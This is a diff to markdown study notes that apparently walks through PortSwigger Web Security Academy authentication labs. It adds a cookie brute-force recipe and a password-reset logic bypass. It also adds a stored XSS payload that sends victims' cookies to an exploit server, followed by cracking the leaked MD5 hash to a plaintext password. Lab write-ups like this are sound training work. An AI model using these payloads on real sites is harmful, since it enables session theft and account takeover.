@@ -311,7 +311,9 @@
   - attack log in using their credentials but change the 'account' cookie to any arbitrary username when submitting the verification code
   - brute-force 2FA verification codes by using 'Turbo Intruder' burp extension.
 - OAuth authentication
-- Other authentication  
+- Other authentication mechanism
+  - predictable/cleartext/stealing cookie value (remember me)
+  - resetting user password (sending passwords by email, easily guess reset password URL, steal another user's token and change their password)
 
 ### Authentication Lab
 1. **Username enumeration** via different **responses**
@@ -397,11 +399,36 @@
       position: mfa-code = $2222$
       payload: Numbers from 0 9999 step 1, min/max 4 digits, max fraction digits 0, resource pool: max concurrent requests 1
     - Load the 302 response in the browser
-19. 565
-20. 4545
-21. 5454
-22. 45454
-23. 454
+19. Brute-forcing a **stay-logged-in cookie**
+    - Your credentials: wiener:peter; Victim's username: carlos   
+    - Decode d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw > wiener:51dc30ddc473d43a6011e9ebba6ca770
+    - Base64 username:md5 password
+    - Burp Intruder Sniper > **Payload processing** > add > load password wordlist
+      - Hash: MD5   
+      - Add prefix: carlos:
+      - Encode: Base64-encode
+    - GET /my-account?id=wiener
+      Cookie: stay-logged-in=§d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw§;
+21. **Offline password cracking**
+    - Post a comment
+      `<script>document.location='https://exploit-0a680029042c93b5820a0aee01dc0053.exploit-server.net/'+document.cookie</script>`
+    - Read the cookie value in exploited server access log
+      `10.0.4.147      2024-07-10 14:26:31 +0000 "GET /secret=stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
+Decode carlos:26323c16d5f4dabff3bb136f2460a943`
+    - Decode carlos:26323c16d5f4dabff3bb136f2460a943
+    - https://crackstation.net/ crack the hash: 26323c16d5f4dabff3bb136f2460a943
+    - carlos:onceuponatime
+23. **Password reset** broken logic
+   - Perform password reset
+     Password reset url in email: https://0a6b00d9033b21ce818ee8ce00b2005e.web-security-academy.net/forgot-password?temp-forgot-password-token=a5fk32fn68feb75ik9xp91sfoekxn11j
+   - Capture the password reset traffic
+     - POST /forgot-password?**temp-forgot-password-token**=a5fk32fn68feb75ik9xp91sfoekxn11j
+     - Body: **temp-forgot-password-token**=a5fk32fn68feb75ik9xp91sfoekxn11j&**username=wiener**&new-password-1=123456&new-password-2=123456
+   - Send to repeater and modify in below
+     - POST /forgot-password?temp-forgot-password-token=
+     - temp-forgot-password-token=&**username=carlos**&new-password-1=123456&new-password-2=123456   
+25. 45454
+26. 454
 
 ## Business Logic Vulnerabilities
 Content for Business Logic Vulnerabilities...
